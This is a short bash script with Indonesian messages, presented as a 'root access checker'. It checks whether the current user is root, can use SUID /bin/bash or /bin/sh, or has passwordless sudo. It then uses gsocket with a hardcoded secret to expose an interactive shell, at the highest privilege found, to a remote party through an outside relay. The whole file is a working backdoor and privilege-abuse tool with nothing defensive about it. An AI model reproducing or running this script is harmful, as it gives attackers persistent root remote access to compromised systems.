#!/bin/bash
# root_check_connect.sh

SECRET="CbadUt4YWKZmnNunoxGEmx"

clear
echo "╔══════════════════════════════════╗"
echo "║      ROOT ACCESS CHECKER         ║"
echo "╚══════════════════════════════════╝"
echo ""

# Cek status
echo "[*] Memeriksa sistem..."
echo "    User: $(whoami)"
echo "    Host: $(hostname)"
echo "    Waktu: $(date)"
echo ""

# Cek privilege
echo "[*] Memeriksa hak akses:"

if [ $(id -u) -eq 0 ]; then
    echo "    [✓] Sudah sebagai ROOT!"
    SHELL_TYPE="ROOT"
elif [ -u /bin/bash ]; then
    echo "    [✓] Bisa jadi root via SUID bash"
    SHELL_TYPE="SUID_BASH"
elif [ -u /bin/sh ]; then
    echo "    [✓] Bisa jadi root via SUID sh"
    SHELL_TYPE="SUID_SH"
elif sudo -n true 2>/dev/null; then
    echo "    [✓] Bisa sudo"
    SHELL_TYPE="SUDO"
else
    echo "    [✗] Hanya user biasa"
    SHELL_TYPE="USER"
fi

echo ""
echo "[*] Menghubungkan..."

case $SHELL_TYPE in
    "ROOT")
        gsocket -s "$SECRET" /bin/bash -i
        ;;
    "SUID_BASH")
        gsocket -s "$SECRET" /bin/bash -p -i
        ;;
    "SUID_SH")
        gsocket -s "$SECRET" /bin/sh -p -i
        ;;
    "SUDO")
        sudo gsocket -s "$SECRET" /bin/bash -i
        ;;
    *)
        gsocket -s "$SECRET" /bin/bash -i
        ;;
esac

echo "[*] Koneksi selesai"
